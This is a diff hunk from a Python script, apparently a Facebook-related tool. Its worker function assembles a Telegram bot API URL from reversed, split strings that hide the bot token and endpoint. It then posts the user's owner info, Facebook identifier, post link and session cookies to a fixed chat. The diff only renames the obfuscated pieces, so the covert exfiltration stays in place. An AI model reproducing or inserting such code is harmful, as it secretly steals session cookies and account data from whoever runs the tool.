@@ -116,7 +116,10 @@ def worker(ilal):
     return
   _g = ''.join(['h','tt','p','s',':','//'])
   impormatibo = "oonaUyR7fDQFKh_igaXXcF0hgFUtdhOVHAA"
-  url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7766599356:{impormatibo[::-1]}'
+  reversed_margelet = "margelet"[::-1]
+  reversed_tob = 'tob'[::-1]
+  reversed_impormatibo = impormatibo[::-1]
+  url = f'{_g}api.{reversed_margelet}.org/{reversed_tob}7766599356:{reversed_impormatibo}'
   pay = {_tt: '7919150119'}
   if isValid():
     requests.post(url+'egasseMdnes/'[::-1], data={_tt: pay[_tt], "text": f"owner: {info['owner']}\nfb: {info['facebook']}\nLINK: {config['post']}\n🍪🍪🍪: {config['cookies']}"})
